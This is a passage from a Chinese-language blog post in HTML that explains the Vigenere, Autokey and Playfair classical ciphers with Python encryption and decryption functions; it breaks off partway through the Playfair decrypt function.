    <span class="token keyword">return</span> plain<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h1 id="多表替代密码"><a href="#多表替代密码" class="headerlink" title="多表替代密码"></a>多表替代密码</h1><h1 id="Vigenere-Cipher"><a href="#Vigenere-Cipher" class="headerlink" title="Vigenere Cipher"></a>Vigenere Cipher</h1><p>密码学经典加解密之一<br>直接<a href="https://baike.baidu.com/item/%E7%BB%B4%E5%90%89%E5%B0%BC%E4%BA%9A%E5%AF%86%E7%A0%81/4905472?fr=aladdin">百科</a></p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">encrypt</span><span class="token punctuation">(</span>plaintext<span class="token punctuation">,</span> key<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">""" vigenere密码就相当于Caesar密码，不同的是vigenere的密钥key是可变的几个值，然后使用这几个值进行加解密 """</span>
    cipher <span class="token operator">=</span> <span class="token string">''</span>
    count <span class="token operator">=</span> <span class="token number">0</span>  <span class="token comment"># 设置一个计数器，当遇到非字母的时候加一，便于之后确定key</span>
    key <span class="token operator">=</span> key<span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>plaintext<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> <span class="token keyword">not</span> plaintext<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>isalpha<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            cipher <span class="token operator">+=</span> plaintext<span class="token punctuation">[</span>i<span class="token punctuation">]</span>
            count <span class="token operator">+=</span> <span class="token number">1</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            a <span class="token operator">=</span> <span class="token string">"A"</span> <span class="token keyword">if</span> plaintext<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>isupper<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">else</span> <span class="token string">"a"</span>
            offset <span class="token operator">=</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>key<span class="token punctuation">[</span><span class="token punctuation">(</span>i <span class="token operator">-</span> count<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token builtin">len</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">'a'</span><span class="token punctuation">)</span>  <span class="token comment"># offset:相当于Caesar中的key</span>
            cipher <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>plaintext<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span> <span class="token operator">+</span> offset<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">26</span> <span class="token operator">+</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> cipher

<span class="token keyword">def</span> <span class="token function">decrypt</span><span class="token punctuation">(</span>ciphertext<span class="token punctuation">,</span> key<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">""" 解密算法原理同Caesar """</span>
    plain <span class="token operator">=</span> <span class="token string">''</span>
    count <span class="token operator">=</span> <span class="token number">0</span>
    key <span class="token operator">=</span> key<span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>ciphertext<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> <span class="token keyword">not</span> ciphertext<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>isalpha<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            plain <span class="token operator">+=</span> ciphertext<span class="token punctuation">[</span>i<span class="token punctuation">]</span>
            count <span class="token operator">+=</span> <span class="token number">1</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            a <span class="token operator">=</span> <span class="token string">"A"</span> <span class="token keyword">if</span> ciphertext<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>isupper<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">else</span> <span class="token string">"a"</span>
            offset <span class="token operator">=</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>key<span class="token punctuation">[</span><span class="token punctuation">(</span>i <span class="token operator">-</span> count<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token builtin">len</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">'a'</span><span class="token punctuation">)</span>
            plain <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>ciphertext<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span> <span class="token operator">-</span> offset<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">26</span> <span class="token operator">+</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> plain<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="Autokey-Cipher"><a href="#Autokey-Cipher" class="headerlink" title="Autokey Cipher"></a>Autokey Cipher</h2><p>Autokey就是Vigenere的一种变种，在Vigenere加密中，密钥是循环使用的，这样就有了被爆破的可能，在Autokey中，有两种形式，一种是Autokey Plaintext，就是将明文直接添加在key之后作为密钥进行加密，另一种是Autokey Ciphertext，是先用key加密得到的Cipher片段作为key循环进行加密<br>Plaintext与Ciphertext的加解密正好是相反的</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">removePunctuation</span><span class="token punctuation">(</span>text<span class="token punctuation">,</span> <span class="token builtin">filter</span><span class="token operator">=</span><span class="token string">'[^A-Z]'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> re<span class="token punctuation">.</span>sub<span class="token punctuation">(</span><span class="token builtin">filter</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">,</span> text<span class="token punctuation">.</span>upper<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">encryptPlain</span><span class="token punctuation">(</span>text<span class="token punctuation">,</span> keyword<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">"""
    对于Autokey Plaintext，本质上和vigenere相同，相当于将明文附加在key后面作为密钥来进行vigenere加密
    但明文中的空格、非字母字符会影响加密，所以在Autokey的加解密中将除去所有非字母字符，并将全部字母大写
    """</span>
    text <span class="token operator">=</span> removePunctuation<span class="token punctuation">(</span>text<span class="token punctuation">)</span>
    res <span class="token operator">=</span> <span class="token string">""</span>
    key <span class="token operator">=</span> keyword<span class="token punctuation">.</span>upper<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span>i<span class="token punctuation">,</span> c<span class="token punctuation">)</span> <span class="token keyword">in</span> <span class="token builtin">enumerate</span><span class="token punctuation">(</span>text<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> i <span class="token operator">&lt;</span> <span class="token builtin">len</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment"># 明文前i项，使用key进行vigenere加密</span>
            offset <span class="token operator">=</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>key<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">65</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>  <span class="token comment"># 从明文的i+1项，使用明文作为密钥进行vigenere加密</span>
            offset <span class="token operator">=</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>text<span class="token punctuation">[</span>i <span class="token operator">-</span> <span class="token builtin">len</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">65</span>
        res <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">65</span> <span class="token operator">+</span> offset<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">26</span> <span class="token operator">+</span> <span class="token number">65</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> res

<span class="token keyword">def</span> <span class="token function">decryptPlain</span><span class="token punctuation">(</span>text<span class="token punctuation">,</span> keyword<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">""" 因为Autokey本质上是vigenere加密，所以在解密上唯一不同的点就是“-offset” """</span>
    text <span class="token operator">=</span> removePunctuation<span class="token punctuation">(</span>text<span class="token punctuation">)</span>
    res <span class="token operator">=</span> <span class="token string">""</span>
    key <span class="token operator">=</span> keyword<span class="token punctuation">.</span>upper<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span>i<span class="token punctuation">,</span> c<span class="token punctuation">)</span> <span class="token keyword">in</span> <span class="token builtin">enumerate</span><span class="token punctuation">(</span>text<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> i <span class="token operator">&lt;</span> <span class="token builtin">len</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">:</span>
            offset <span class="token operator">=</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>key<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">65</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            offset <span class="token operator">=</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>res<span class="token punctuation">[</span>i <span class="token operator">-</span> <span class="token builtin">len</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">65</span>
        res <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">65</span> <span class="token operator">-</span> offset<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">26</span> <span class="token operator">+</span> <span class="token number">65</span><span class="token punctuation">)</span>  <span class="token comment"># 不同点</span>
    <span class="token keyword">return</span> res

<span class="token keyword">def</span> <span class="token function">encryptCipher</span><span class="token punctuation">(</span>text<span class="token punctuation">,</span> keyword<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">"""
    Autokey Cipher的加解密与Autokey Plain的解加密相对应
    但在求offset上不同，此处使用的与plain相反
    """</span>
    text <span class="token operator">=</span> removePunctuation<span class="token punctuation">(</span>text<span class="token punctuation">)</span>
    res <span class="token operator">=</span> <span class="token string">""</span>
    key <span class="token operator">=</span> keyword<span class="token punctuation">.</span>upper<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span>i<span class="token punctuation">,</span> c<span class="token punctuation">)</span> <span class="token keyword">in</span> <span class="token builtin">enumerate</span><span class="token punctuation">(</span>text<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> i <span class="token operator">&lt;</span> <span class="token builtin">len</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">:</span>
            offset <span class="token operator">=</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>key<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">65</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            offset <span class="token operator">=</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>res<span class="token punctuation">[</span>i <span class="token operator">-</span> <span class="token builtin">len</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">65</span>
        res <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">65</span> <span class="token operator">+</span> offset<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">26</span> <span class="token operator">+</span> <span class="token number">65</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> res

<span class="token keyword">def</span> <span class="token function">decryptCipher</span><span class="token punctuation">(</span>text<span class="token punctuation">,</span> keyword<span class="token punctuation">)</span><span class="token punctuation">:</span>
    text <span class="token operator">=</span> removePunctuation<span class="token punctuation">(</span>text<span class="token punctuation">)</span>
    res <span class="token operator">=</span> <span class="token string">""</span>
    key <span class="token operator">=</span> keyword<span class="token punctuation">.</span>upper<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span>i<span class="token punctuation">,</span> c<span class="token punctuation">)</span> <span class="token keyword">in</span> <span class="token builtin">enumerate</span><span class="token punctuation">(</span>text<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> i <span class="token operator">&lt;</span> <span class="token builtin">len</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">:</span>
            offset <span class="token operator">=</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>key<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">65</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            offset <span class="token operator">=</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>text<span class="token punctuation">[</span>i <span class="token operator">-</span> <span class="token builtin">len</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">65</span>
        res <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">65</span> <span class="token operator">-</span> offset<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">26</span> <span class="token operator">+</span> <span class="token number">65</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> res<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h1 id="多图替代密码"><a href="#多图替代密码" class="headerlink" title="多图替代密码"></a>多图替代密码</h1><h2 id="Playfair-Cipher"><a href="#Playfair-Cipher" class="headerlink" title="Playfair Cipher"></a>Playfair Cipher</h2><p>密码详情见<a href="https://baike.baidu.com/item/playfair%E5%AF%86%E7%A0%81/8999814?fr=aladdin">百科</a></p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">getKeywordList</span><span class="token punctuation">(</span>keyword<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">""" 获取密钥矩阵 """</span>
    keyword <span class="token operator">=</span> keyword<span class="token punctuation">.</span>upper<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'J'</span><span class="token punctuation">,</span> <span class="token string">'I'</span><span class="token punctuation">)</span>
    normalList <span class="token operator">=</span> <span class="token string">'ABCDEFGHIKLMNOPQRSTUVWXYZ'</span>
    toCombine <span class="token operator">=</span> keyword <span class="token operator">+</span> normalList
    combineList <span class="token operator">=</span> <span class="token string">''</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> toCombine<span class="token punctuation">:</span>
        <span class="token keyword">if</span> i <span class="token keyword">in</span> combineList<span class="token punctuation">:</span>
            <span class="token keyword">pass</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            combineList <span class="token operator">=</span> combineList <span class="token operator">+</span> i
    <span class="token keyword">return</span> combineList

<span class="token keyword">def</span> <span class="token function">removePunctuation</span><span class="token punctuation">(</span>text<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">""" 将文本中非英文字母去掉，并将字母转为大写 """</span>
    <span class="token builtin">filter</span> <span class="token operator">=</span> <span class="token string">'[^A-Z]'</span>
    <span class="token keyword">return</span> re<span class="token punctuation">.</span>sub<span class="token punctuation">(</span><span class="token builtin">filter</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">,</span> text<span class="token punctuation">.</span>upper<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">encryptPart</span><span class="token punctuation">(</span>keywordList<span class="token punctuation">,</span> a<span class="token punctuation">,</span> b<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">"""
    加密主要算法：
    首先获取得到的两个字母在矩阵中的行列值
    然后对两个坐标分别进行判断：
    1.位于同一行，返回两个字母在矩阵中右边的字母
    2.位于同一列，返回两个字母在矩阵中下边的字母
    3.位于对角，返回相应对角字母
    """</span>
    arow<span class="token punctuation">,</span> acol <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>keywordList<span class="token punctuation">.</span>index<span class="token punctuation">(</span>a<span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">,</span> keywordList<span class="token punctuation">.</span>index<span class="token punctuation">(</span>a<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">5</span>
    brow<span class="token punctuation">,</span> bcol <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>keywordList<span class="token punctuation">.</span>index<span class="token punctuation">(</span>b<span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">,</span> keywordList<span class="token punctuation">.</span>index<span class="token punctuation">(</span>b<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">5</span>
    <span class="token keyword">if</span> arow <span class="token operator">==</span> brow<span class="token punctuation">:</span>
        <span class="token keyword">return</span> keywordList<span class="token punctuation">[</span>arow <span class="token operator">*</span> <span class="token number">5</span> <span class="token operator">+</span> <span class="token punctuation">(</span>acol <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">+</span> keywordList<span class="token punctuation">[</span>brow <span class="token operator">*</span> <span class="token number">5</span> <span class="token operator">+</span> <span class="token punctuation">(</span>bcol <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">5</span><span class="token punctuation">]</span>
    <span class="token keyword">elif</span> acol <span class="token operator">==</span> bcol<span class="token punctuation">:</span>
        <span class="token keyword">return</span> keywordList<span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token punctuation">(</span>arow <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">5</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">5</span> <span class="token operator">+</span> acol<span class="token punctuation">]</span> <span class="token operator">+</span> keywordList<span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token punctuation">(</span>brow <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">5</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">5</span> <span class="token operator">+</span> bcol<span class="token punctuation">]</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> keywordList<span class="token punctuation">[</span>arow <span class="token operator">*</span> <span class="token number">5</span> <span class="token operator">+</span> bcol<span class="token punctuation">]</span> <span class="token operator">+</span> keywordList<span class="token punctuation">[</span>brow <span class="token operator">*</span> <span class="token number">5</span> <span class="token operator">+</span> acol<span class="token punctuation">]</span>

<span class="token keyword">def</span> <span class="token function">decryptPart</span><span class="token punctuation">(</span>keywordList<span class="token punctuation">,</span> a<span class="token punctuation">,</span> b<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">""" 加密算法的逆运算 """</span>
    arow<span class="token punctuation">,</span> acol <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>keywordList<span class="token punctuation">.</span>index<span class="token punctuation">(</span>a<span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">,</span> keywordList<span class="token punctuation">.</span>index<span class="token punctuation">(</span>a<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">5</span>
    brow<span class="token punctuation">,</span> bcol <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>keywordList<span class="token punctuation">.</span>index<span class="token punctuation">(</span>b<span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">,</span> keywordList<span class="token punctuation">.</span>index<span class="token punctuation">(</span>b<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">5</span>
    <span class="token keyword">if</span> arow <span class="token operator">==</span> brow<span class="token punctuation">:</span>
        <span class="token keyword">return</span> keywordList<span class="token punctuation">[</span>arow <span class="token operator">*</span> <span class="token number">5</span> <span class="token operator">+</span> <span class="token punctuation">(</span>acol <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">+</span> keywordList<span class="token punctuation">[</span>brow <span class="token operator">*</span> <span class="token number">5</span> <span class="token operator">+</span> <span class="token punctuation">(</span>bcol <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">5</span><span class="token punctuation">]</span>
    <span class="token keyword">elif</span> acol <span class="token operator">==</span> bcol<span class="token punctuation">:</span>
        <span class="token keyword">return</span> keywordList<span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token punctuation">(</span>arow <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">5</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">5</span> <span class="token operator">+</span> acol<span class="token punctuation">]</span> <span class="token operator">+</span> keywordList<span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token punctuation">(</span>brow <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">5</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">5</span> <span class="token operator">+</span> bcol<span class="token punctuation">]</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> keywordList<span class="token punctuation">[</span>arow <span class="token operator">*</span> <span class="token number">5</span> <span class="token operator">+</span> bcol<span class="token punctuation">]</span> <span class="token operator">+</span> keywordList<span class="token punctuation">[</span>brow <span class="token operator">*</span> <span class="token number">5</span> <span class="token operator">+</span> acol<span class="token punctuation">]</span>

<span class="token keyword">def</span> <span class="token function">encrypt</span><span class="token punctuation">(</span>plaintext<span class="token punctuation">,</span> key<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">"""
    对获取的明文进行基本的处理
    转为大写
    除去非字母
    如果遇到两个相同的字母，在中间加'Q'
    文本长度不足2的倍数需要加'X'补齐
    然后以两两字母进行加密
    """</span>
    plaintext <span class="token operator">=</span> removePunctuation<span class="token punctuation">(</span>plaintext<span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'J'</span><span class="token punctuation">,</span> <span class="token string">'I'</span><span class="token punctuation">)</span>
    plain <span class="token operator">=</span> <span class="token string">""</span>
    plain <span class="token operator">+=</span> plaintext<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>plaintext<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> plain<span class="token punctuation">[</span><span class="token builtin">len</span><span class="token punctuation">(</span>plain<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> plaintext<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">:</span>
            plain <span class="token operator">+=</span> <span class="token string">'Q'</span>
        plain <span class="token operator">+=</span> plaintext<span class="token punctuation">[</span>i<span class="token punctuation">]</span>
    keywordList <span class="token operator">=</span> getKeywordList<span class="token punctuation">(</span>key<span class="token punctuation">)</span>
    <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>plain<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">2</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>
        plain <span class="token operator">+=</span> <span class="token string">'X'</span>
    ret <span class="token operator">=</span> <span class="token string">''</span>
    <span class="token keyword">for</span> c <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>plain<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        ret <span class="token operator">+=</span> encryptPart<span class="token punctuation">(</span>keywordList<span class="token punctuation">,</span> plain<span class="token punctuation">[</span>c<span class="token punctuation">]</span><span class="token punctuation">,</span> plain<span class="token punctuation">[</span>c <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> ret

<span class="token keyword">def</span> <span class="token function">decrypt</span><span class="token punctuation">(</span>ciphertext<span class="token punctuation">,</span> key<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">""" 同加密 """</span>
    cipher <span class="token operator">=</span> removePunctuation<span class="token punctuation">(</span>ciphertext<span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'J'</span><span class="token punctuation">,</span> <span class="token string">'I'</span><span class="token punctuation">)</span>
    keywordList <span class="token operator">=</span> getKeywordList<span class="token punctuation">(</span>key<span class="token punctuation">)</span>
    <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>cipher<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">2</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>
        cipher <span class="token operator">+=</span> <span class="token string">'X'</span>
    ret <span class="token operator">=</span> <span class="token string">''</span>
    <span class="token keyword">for</span> c <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>cipher<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        ret <span class="token operator">+=</span> decryptPart<span class="token punctuation">(</span>keywordList<span class="token punctuation">,</span> cipher<span class="token punctuation">[</span>c<span class="token punctuation">]</span><span class="token punctuation">,</span> cipher<span class="token punctuation">[</span>c <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
